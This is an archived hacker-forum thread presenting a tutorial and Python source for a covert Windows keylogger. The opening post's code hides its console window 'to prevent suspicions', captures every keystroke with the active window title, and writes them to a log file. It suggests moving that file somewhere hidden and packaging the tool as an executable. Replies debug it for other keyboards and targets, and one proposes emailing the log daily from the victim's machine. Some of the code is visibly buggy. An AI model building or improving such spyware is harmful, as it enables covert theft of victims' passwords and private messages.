<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Python Windows Keylogger - Malware - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Intrigued by the community here, I decided to start back at developing malware as I had went into a 2 year hybernation. I began by seeing what was developed here and how I could improve the solutions, I found tr4cefl0w a&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="11939.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="m2kBZfs0FJ7n2HsnX5ffwOqQS"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="m2kBZfs0FJ7n2HsnX5ffwOqQS"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Python Windows Keylogger&#39;" href="11939.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/8/81dd1d4b031440f945dd5074d6509f1dc917ec0a.jpeg" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/8/81dd1d4b031440f945dd5074d6509f1dc917ec0a.jpeg" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/python-windows-keylogger/11939" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/python-windows-keylogger/11939" />
<meta property="og:title" content="Python Windows Keylogger" />
<meta name="twitter:title" content="Python Windows Keylogger" />
<meta property="og:description" content="Intrigued by the community here, I decided to start back at developing malware as I had went into a 2 year hybernation. I began by seeing what was developed here and how I could improve the solutions, I found tr4cefl0w and his two topic on the development of a keylogger with python. Being unfamiliar with the Windows API, I took a short dive and decided I was not going to be making any use of it with Python. I found the pip module Keyboard that was briefly mentioned in the part 2 of tra4cefl0wâ€™s ..." />
<meta name="twitter:description" content="Intrigued by the community here, I decided to start back at developing malware as I had went into a 2 year hybernation. I began by seeing what was developed here and how I could improve the solutions, I found tr4cefl0w and his two topic on the development of a keylogger with python. Being unfamiliar with the Windows API, I took a short dive and decided I was not going to be making any use of it with Python. I found the pip module Keyboard that was briefly mentioned in the part 2 of tra4cefl0wâ€™s ..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="keylogger" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="2 mins ðŸ•‘" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="7 â¤" />
<meta property="article:published_time" content="2019-02-28T13:53:40+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="11939.html">Python Windows Keylogger</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/malware/56.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #F7941D'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Malware</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/keylogger.html' class='discourse-tag' rel="tag">keylogger</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Python Windows Keylogger'>
      <link itemprop='url' href='11939.html'>
      <meta itemprop='datePublished' content='2019-02-28T13:53:40Z'>
        <meta itemprop='articleSection' content='Malware'>
      <meta itemprop='keywords' content='keylogger'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/BrokenAdministrator.html'><span itemprop='name'>BrokenAdministrator</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="11939.html">

                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/8/81dd1d4b031440f945dd5074d6509f1dc917ec0a.jpeg">

              <span class="crawler-post-infos">
                  <time  datetime='2019-02-28T13:53:40Z' class='post-time'>
                    February 28, 2019,  1:53pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-01T04:59:50Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Intrigued by the community here, I decided to start back at developing malware as I had went into a 2 year hybernation. I began by seeing what was developed here and how I could improve the solutions, I found tr4cefl0w and his two topic on the development of a keylogger with python. Being unfamiliar with the Windows API, I took a short dive and decided I was not going to be making any use of it with Python. I found the pip module <code>Keyboard</code> that was briefly mentioned in the <a href="../../../external.html?link=https://0x00sec.org/t/malware-writing-python-malware-part-2-keylogging-with-ctypes-and-setwindowshookexa/11858">part 2</a> of tra4cefl0wâ€™s malware writing.</p>
<p>Credits to tr4cefl0w for the beginning code. Decidedly, letâ€™s get over to the development!</p>
<p>To begin you should create a folder for the project and a sub-folder named modules, create a file named <code>keyboard.py</code> and open it in your preferred editor. <strong>It is also required you install the pip module</strong> <code>Keyboard</code><strong>.</strong></p>
<h1>/project_folder/modules/Keyboard.py</h1>
<p>To begin we will import our base libraries, and hide the console to prevent suspicions.</p>
<pre><code class="lang-auto">import keyboard # For recording keystrokes
from datetime import datetime # Optional, to record timestamps
import ctypes # For interfacing with C functions

# Required librairies
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

# Hide console
user32.ShowWindow(kernel32.GetConsoleWindow(), 0)
</code></pre>
<h2>get_current_window() function</h2>
<p>Next we will use the function written by tr4cefl0w, <code>get_current_window()</code>.</p>
<pre><code class="lang-auto">def get_current_window(): # Function to grab the current window and its title

    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow() # Get handle to foreground window
    length = GetWindowTextLength(hwnd) # Get length of the window text in title bar
    buff = ctypes.create_unicode_buffer(length + 1) # Create buffer to store the window title string
    
    GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff

    return buff.value # Return the value of buff
</code></pre>
<p>Finally, on to the code I have developed.</p>
<h2>get_timestamp()</h2>
<pre><code class="lang-auto">def get_timestamp(): # Optional, used later for writing timestamp to file.
  return(round(datetime.now().timestamp()))
</code></pre>
<h2>write_to(file, content)</h2>
<pre><code class="lang-auto">def write_to(file, content): # Used later for writing to file
  file.write(content)
</code></pre>
<h2>write_key(key)</h2>
<p>This is the meat of the code, and will be what we send keystrokes to.</p>
<pre><code class="lang-auto">def write_key(key): # key - name, scan_code, time
  global key_info # String of key info
  global key_list # List of key names 
  global prev_window # Last window used

  window = get_current_window()

  if(window==prev_window): # If in same window, add to list of keys used in this window
    key_info.append(str(key.name) + " | " + " | " + str(round(key.time))) # Add key, scan code and timestamp to current list as string
    key_list.append(str(key.name)) # Add key name to list as string
    return
  # If not in same window, write keys to output file.
  content = "Date - " + str(datetime.now()) + " | Timestamp - " + str(get_timestamp()) + "\nWindow - " + str(get_current_window()) + "\nKeys - \n" + str("\n".join(key_info)) + "\n" + ", ".join(key_list) + "\n"
  out = open("c:/users/public/" + str(filename), "a")
  write_to(out, content)
  # Where the file should be stored and the name of the file
  filename = str("test.txt")
  directory = str(os.environ["windir"]) + "\\..\\users\\public\\"
  # Writing
  out.close() # Close the files
  key_info = [] # Reset array
  key_list = [] # Reset array
  prev_window = window # Reset the previous window to the current window
  key_info.append(str(key.name) + " | " + str(key.scan_code) + " | " + str(round(key.time))) # Update list with new key, scan code and timestamp
  key_list.append(str(key.name)) # Update list with key name
</code></pre>
<h3>How the function works</h3>
<ul>
<li>This function is first passed a key, each key has the attributes <code>name</code>, <code>scan_code</code> and <code>time</code>.</li>
<li>When passed the key, it is first checked if the user is still in the previous window, this is only useful when the function has been used once already.</li>
</ul>
<h4>Same Window</h4>
<ul>
<li>Next, checking if the keys are entered into the same function, the arrays <code>key_list</code> and <code>key_info</code> are updated.
<ul>
<li>
<code>key_info</code> stores the name of the key alongside the timestamp it was recorded to have been pushed at.</li>
<li>
<code>key_list</code> stores the keys that have been entered in the current window.</li>
<li>It then returns and waits for the next keystroke</li>
</ul>
</li>
</ul>
<h4>New Window</h4>
<ul>
<li>If the keys were pressed in a new window, the previous is skipped.
<ul>
<li>The current date, <code>key_info</code> and <code>key_list</code> are written to a variable named <code>content</code>
</li>
<li>A file is opened with the option to append. For more information about this see <a href="../../../external.html?link=https://www.tutorialspoint.com/python/python_files_io.htm" rel="noopener nofollow ugc">here</a>
</li>
<li>This file is stored in the public user directory, which all users can read or write to. You can change this location to somewhere more hidden if youâ€™d like, later on.</li>
<li>The variable <code>content</code> and variable pointing to the file, <code>out</code> are then sent to the function <code>write_to</code> and <code>content</code> is written to the file.</li>
<li>The file is then closed</li>
<li>Now the arrays and current window can be safely reset</li>
<li>Finally, the new key pressed is written to the arrays</li>
</ul>
</li>
</ul>
<h2>prepare()</h2>
<p>This is called in the main file to prepare the script.</p>
<pre><code class="lang-auto">def prepare():
  global key_info # String of key info
  global key_list # List of key names 
  global prev_window # Last window used
  
  # Set up the arrays
  key_info = []
  key_list = [] 
  prev_window = str()

  keyboard.on_press(write_key) # When a key is pressed, call the write_key function
  keyboard.wait() # This prevents the script from ending and allows for the previous command to continue running.
</code></pre>
<h1>/project_folder/main.py</h1>
<pre><code class="lang-auto">from modules import keyboard # Import the file we just wrote

if __name__ == '__main__':
  keyboard.filename = "log.txt" # This variable can be changed to any name you'd like your log file to have
  keyboard.prepare() # Call the prepare function to set up the keylogger.
</code></pre>
<h2>Executable</h2>
<p>You can use <a href="../../../external.html?link=https://www.pyinstaller.org/" rel="noopener nofollow ugc">PyInstaller</a> to create and executable with this code.</p>
<h2>Github Link</h2>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="../../../external.html?link=https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="../../../external.html?link=https://github.com/Broken-Admin/WindowsKeylogger" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="../../../0x00sec.s3.amazonaws.com/original/2X/8/81dd1d4b031440f945dd5074d6509f1dc917ec0a.jpeg" class="thumbnail" width="" height="">

<h3><a href="../../../external.html?link=https://github.com/Broken-Admin/WindowsKeylogger" target="_blank" rel="noopener nofollow ugc">Broken-Admin/WindowsKeylogger</a></h3>

<p>A simple Windows keylogger. Contribute to Broken-Admin/WindowsKeylogger development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="5" />
              <span class='post-likes'>5 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/tr4cefl0w.html'><span itemprop='name'>tr4cefl0w</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-02-28T14:57:02Z' class='post-time'>
                    February 28, 2019,  2:57pm
                  </time>
                  <meta itemprop='dateModified' content='2019-02-28T15:39:36Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hereâ€™s the issue when using  French Canadian keyboard for example:</p>
<pre><code class="lang-auto">Date - 2019-02-28 10:37:07.743972 | Timestamp - 1551368228
Window - log.txt - Notepad
Keys - 
Ã© | 53 | 1551368216
alt gr | 541 | 1551368216
` | 26 | 1551368217
a | 30 | 1551368219
/ | 41 | 1551368219
Ã©, alt gr, `, a, /
Date - 2019-02-28 10:37:11.395596 | Timestamp - 1551368231
Window - [tr4cefl0w] - Powershell
Keys - 
ctrl | 29 | 1551368228
c | 46 | 1551368228
ctrl, c
</code></pre>
<p>Where you see the <code>a</code> it should be <code>Ã </code>. Same issue with multiple characters. Also, would be nice to have everything on a single line! My guess is you would have to make a lot of conditional statements for combo keys. In the end, for the sake of stability and being able to have all the characters translated properly without wasting time debugging, I personally prefer ctypes. But otherwise, itâ€™s pretty decent nonetheless.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/BrokenAdministrator.html'><span itemprop='name'>BrokenAdministrator</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-02-28T16:07:42Z' class='post-time'>
                    February 28, 2019,  4:07pm
                  </time>
                  <meta itemprop='dateModified' content='2019-02-28T16:07:42Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Iâ€™m an American, so I understand why you had problems. As for the single line, at the very end of the keys it lists the keys pressed.</p>
<pre><code class="lang-auto">Ã© | 53 | 1551368216
alt gr | 541 | 1551368216
` | 26 | 1551368217
a | 30 | 1551368219
/ | 41 | 1551368219
Ã©, alt gr, `, a, /
</code></pre>
<p>The very last line displays <code>Ã©, alt gr, `, a, /</code>.<br>
Thanks for the feedback, Iâ€™ll try to find a solution for foreign keyboards before my next post!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/dtm.html'><span itemprop='name'>dtm</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-01T02:33:27Z' class='post-time'>
                    March 1, 2019,  2:33am
                  </time>
                  <meta itemprop='dateModified' content='2019-03-01T02:33:27Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <aside class="quote no-group" data-username="BrokenAdministrator" data-post="1" data-topic="11939">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="24" height="24" src="../../user_avatar/d.clarkee.co.uk/brokenadministrator/48/8052_2.png" class="avatar"> BrokenAdministrator:</div>
<blockquote>
<pre data-code-wrap="python"><code class="lang-python">out = open("c:/users/public/" + str(filename), "a")
</code></pre>
</blockquote>
</aside>
<p>Call me picky but no one should hardcode the drive letter. I hear that even professional software do this and break. Just a heads up.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/tr4cefl0w.html'><span itemprop='name'>tr4cefl0w</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-01T02:45:54Z' class='post-time'>
                    March 1, 2019,  2:45am
                  </time>
                  <meta itemprop='dateModified' content='2019-03-01T02:45:54Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>I agree with <a class="mention" href="../../u/dtm.html">@dtm</a> itâ€™s better to use system or user default environment variables to avoid crashing your program. If you insist on using hardcoded path, put some exception handling with conditional statements. Also, while rare, if the target is an XP machine, thatâ€™s not going to work.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/BrokenAdministrator.html'><span itemprop='name'>BrokenAdministrator</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-01T05:00:35Z' class='post-time'>
                    March 1, 2019,  5:00am
                  </time>
                  <meta itemprop='dateModified' content='2019-03-01T05:00:35Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>The issue should be addressed in <code>write_key</code> function.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/xXxH4CK0RxXx.html'><span itemprop='name'>xXxH4CK0RxXx</span></a>
                (Lulumichen)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2019-03-02T19:06:30Z' class='post-time'>
                    March 2, 2019,  7:06pm
                  </time>
                  <meta itemprop='dateModified' content='2019-03-02T19:06:30Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>To add to this you could create a program that sends you the text document at a certain time everyday through email with the smtplib library. just an idea since the file will be stored on the victimâ€™s computer.</p>
            </div>

